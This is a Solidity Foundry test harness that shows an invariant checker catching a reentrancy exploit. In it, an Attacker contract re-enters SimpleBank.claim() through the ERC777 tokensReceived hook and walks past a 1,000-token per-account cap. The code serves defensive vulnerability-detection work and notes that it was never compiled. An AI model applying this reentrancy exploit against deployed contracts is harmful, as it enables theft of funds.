// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "../src/SimpleBank.sol";

/*
  STAGE 3 — invariant verification on a real EVM.

  What this file is meant to demonstrate:

    "The validator never decides whether something is a vulnerability.
     It planted an invariant as an assert and executed it, and the miner's
     exploit broke it."

  Cast:
    InvariantChecker  the validator. Runs asserts. Contains no verdict logic.
    Attacker          the miner. Reenters claim() through the ERC777 hook.
    BenignUser        normal traffic, to check for false positives.

  Run:
    forge test --match-contract InvariantCheckTest -vv

  Expected: all three tests [PASS]
    testExploitSucceedsWithoutInvariant  without an assert, the exploit succeeds silently
    testInvariantCatchesExploit          with the invariant planted, the exploit breaks it
    testInvariantAllowsBenign            normal traffic does not break it (no false positive)

  NOTE: this harness has not been compiled or executed. The build environment
  had no Foundry installation. See docs/evidence.md.
*/

// ─────────────────────────────────────────────────────────────────────────────
// THE VALIDATOR — runs asserts, decides nothing.
// The bodies below are where the solidity_assert strings produced by
// generate_invariants.mjs in stage 2 get planted verbatim.
// ─────────────────────────────────────────────────────────────────────────────
contract InvariantChecker {
    SimpleBank public bank;
    ERC777 public token;

    constructor(SimpleBank _bank, ERC777 _token) {
        bank = _bank;
        token = _token;
    }

    /// INV-1 [money_flow/PerAccountUpperBound]
    /// Cumulative allocation per account may not exceed the cap, including at
    /// transaction end — not just at function entry.
    function checkPerAccountUpperBound(address account) external view {
        assert(bank._mints(account) <= bank.maxMints());
    }

    /// INV-2 [money_flow/AccountingConservation]
    /// The tokens actually delivered may not exceed the same cap.
    function checkBalanceUpperBound(address account) external view {
        assert(token.balanceOf(account) <= bank.maxMints());
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// THE MINER — searches for a proof-of-concept and runs it.
// ─────────────────────────────────────────────────────────────────────────────
contract Attacker {
    SimpleBank public bank;
    ERC777 public token;
    bool public reentered;

    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH =
        keccak256("ERC777TokensRecipient");

    constructor(SimpleBank _bank, ERC777 _token) {
        bank = _bank;
        token = _token;
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24)
            .setInterfaceImplementer(
                address(this),
                _TOKENS_RECIPIENT_INTERFACE_HASH,
                address(this)
            );
    }

    function attack() external {
        // The per-account cap is 1,000. Ask for 900.
        bank.claim(address(this), 900);
    }

    // Called during the ERC777 transfer — at this point bank._mints[this] is still 0.
    function tokensReceived(
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external {
        if (!reentered && token.balanceOf(address(this)) <= 1000) {
            reentered = true;
            bank.claim(address(this), 1000); // reenter — require passes a second time
        }
    }

    receive() external payable {}
}

// ─────────────────────────────────────────────────────────────────────────────
// NORMAL USER — the hook does nothing.
// ─────────────────────────────────────────────────────────────────────────────
contract BenignUser {
    SimpleBank public bank;
    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH =
        keccak256("ERC777TokensRecipient");

    constructor(SimpleBank _bank) {
        bank = _bank;
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24)
            .setInterfaceImplementer(
                address(this),
                _TOKENS_RECIPIENT_INTERFACE_HASH,
                address(this)
            );
    }

    function claim(uint256 amount) external {
        bank.claim(address(this), amount);
    }

    function tokensReceived(
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external {}

    receive() external payable {}
}

contract MyERC777 is ERC777 {
    constructor() ERC777("Gold", "GLD", new address[](0)) {}

    function mint(address account, uint256 amount) public returns (bool) {
        _mint(account, amount, "", "");
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
contract InvariantCheckTest is Test {
    MyERC777 token;
    SimpleBank bank;
    InvariantChecker checker;

    function setUp() public {
        // ERC-1820 is a standard registry deployed at a fixed address. Etch a local mock.
        vm.etch(
            address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24),
            hex"608060405234801561001057600080fd5b50600436106100a5576000357c010000000000000000000000000000000000000000000000000000000090048063a41e7d5111610078578063a41e7d51146101d4578063aabbb8ca1461020a578063b705676514610236578063f712f3e814610280576100a5565b806329965a1d146100aa5780633d584063146100e25780635df8122f1461012457806365ba36c114610152575b600080fd5b6100e0600480360360608110156100c057600080fd5b50600160a060020a038135811691602081013591604090910135166102b6565b005b610108600480360360208110156100f857600080fd5b5035600160a060020a0316610570565b60408051600160a060020a039092168252519081900360200190f35b6100e06004803603604081101561013a57600080fd5b50600160a060020a03813581169160200135166105bc565b6101c26004803603602081101561016857600080fd5b81019060208101813564010000000081111561018357600080fd5b82018360208201111561019557600080fd5b803590602001918460018302840111640100000000831117156101b757600080fd5b5090925090506106b3565b60408051918252519081900360200190f35b6100e0600480360360408110156101ea57600080fd5b508035600160a060020a03169060200135600160e060020a0319166106ee565b6101086004803603604081101561022057600080fd5b50600160a060020a038135169060200135610778565b61026c6004803603604081101561024c57600080fd5b508035600160a060020a03169060200135600160e060020a0319166107ef565b604080519115158252519081900360200190f35b61026c6004803603604081101561029657600080fd5b508035600160a060020a03169060200135600160e060020a0319166108aa565b6000600160a060020a038416156102cd57836102cf565b335b9050336102db82610570565b600160a060020a031614610339576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b6103428361092a565b15610397576040805160e560020a62461bcd02815260206004820152601a60248201527f4d757374206e6f7420626520616e204552433136352068617368000000000000604482015290519081900360640190fd5b600160a060020a038216158015906103b85750600160a060020a0382163314155b156104ff5760405160200180807f455243313832305f4143434550545f4d4147494300000000000000000000000081525060140190506040516020818303038152906040528051906020012082600160a060020a031663249cb3fa85846040518363ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018083815260200182600160a060020a0316600160a060020a031681526020019250505060206040518083038186803b15801561047e57600080fd5b505afa158015610492573d6000803e3d6000fd5b505050506040513d60208110156104a857600080fd5b5051146104ff576040805160e560020a62461bcd02815260206004820181905260248201527f446f6573206e6f7420696d706c656d656e742074686520696e74657266616365604482015290519081900360640190fd5b600160a060020a03818116600081815260208181526040808320888452909152808220805473ffffffffffffffffffffffffffffffffffffffff19169487169485179055518692917f93baa6efbd2244243bfee6ce4cfdd1d04fc4c0e9a786abd3a41313bd352db15391a450505050565b600160a060020a03818116600090815260016020526040812054909116151561059a5750806105b7565b50600160a060020a03808216600090815260016020526040902054165b919050565b336105c683610570565b600160a060020a031614610624576040805160e560020a62461bcd02815260206004820152600f60248201527f4e6f7420746865206d616e616765720000000000000000000000000000000000604482015290519081900360640190fd5b81600160a060020a031681600160a060020a0316146106435780610646565b60005b600160a060020a03838116600081815260016020526040808220805473ffffffffffffffffffffffffffffffffffffffff19169585169590951790945592519184169290917f605c2dbf762e5f7d60a546d42e7205dcb1b011ebc62a61736a57c9089d3a43509190a35050565b600082826040516020018083838082843780830192505050925050506040516020818303038152906040528051906020012090505b92915050565b6106f882826107ef565b610703576000610705565b815b600160a060020a03928316600081815260208181526040808320600160e060020a031996909616808452958252808320805473ffffffffffffffffffffffffffffffffffffffff19169590971694909417909555908152600284528181209281529190925220805460ff19166001179055565b600080600160a060020a038416156107905783610792565b335b905061079d8361092a565b156107c357826107ad82826108aa565b6107b85760006107ba565b815b925050506106e8565b600160a060020a0390811660009081526020818152604080832086845290915290205416905092915050565b6000808061081d857f01ffc9a70000000000000000000000000000000000000000000000000000000061094c565b909250905081158061082d575080155b1561083d576000925050506106e8565b61084f85600160e060020a031961094c565b909250905081158061086057508015155b15610870576000925050506106e8565b61087a858561094c565b909250905060018214801561088f5750806001145b1561089f576001925050506106e8565b506000949350505050565b600160a060020a0382166000908152600260209081526040808320600160e060020a03198516845290915281205460ff1615156108f2576108eb83836107ef565b90506106e8565b50600160a060020a03808316600081815260208181526040808320600160e060020a0319871684529091529020549091161492915050565b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff161590565b6040517f01ffc9a7000000000000000000000000000000000000000000000000000000008082526004820183905260009182919060208160248189617530fa90519096909550935050505056fea165627a7a72305820377f4a2d4301ede9949f163f319021a6e9c687c292a5e2b2c4734c126b524e6c0029"
        );

        token = new MyERC777();
        bank = new SimpleBank(address(token));
        token.mint(address(bank), 10_000);
        checker = new InvariantChecker(bank, ERC777(address(token)));
    }

    /// Without an invariant the exploit succeeds with no error at all.
    /// This is what "a validator that has to judge cannot catch it" looks like.
    function testExploitSucceedsWithoutInvariant() public {
        Attacker attacker = new Attacker(bank, ERC777(address(token)));
        attacker.attack(); // no revert

        uint256 balance = token.balanceOf(address(attacker));
        uint256 accounted = bank._mints(address(attacker));
        console.log("attacker balance :", balance);          // 1900
        console.log("bank._mints      :", accounted);        // 1900
        console.log("maxMintsPerAddr  :", bank.maxMints());  // 1000

        assertEq(balance, 1900, "reentrancy bypassed the cap of 1000");
        assertGt(balance, bank.maxMints());
    }

    /// With the invariant planted as an assert, the validator detects the exploit
    /// by executing it — no judgment involved.
    function testInvariantCatchesExploit() public {
        Attacker attacker = new Attacker(bank, ERC777(address(token)));
        attacker.attack();

        // A failing assert reverts with Panic(0x01) — the invariant broke.
        vm.expectRevert(stdError.assertionError);
        checker.checkPerAccountUpperBound(address(attacker));

        vm.expectRevert(stdError.assertionError);
        checker.checkBalanceUpperBound(address(attacker));
    }

    /// The same invariants do not break on normal traffic (zero false positives).
    function testInvariantAllowsBenign() public {
        BenignUser user = new BenignUser(bank);

        user.claim(900);
        checker.checkPerAccountUpperBound(address(user));
        checker.checkBalanceUpperBound(address(user));

        user.claim(100); // cumulative 1000 — exactly at the cap
        checker.checkPerAccountUpperBound(address(user));
        checker.checkBalanceUpperBound(address(user));

        assertEq(bank._mints(address(user)), 1000);

        // A normal call that would exceed the cap is stopped by require first.
        vm.expectRevert("Exceeds max mints per address");
        user.claim(1);
    }
}
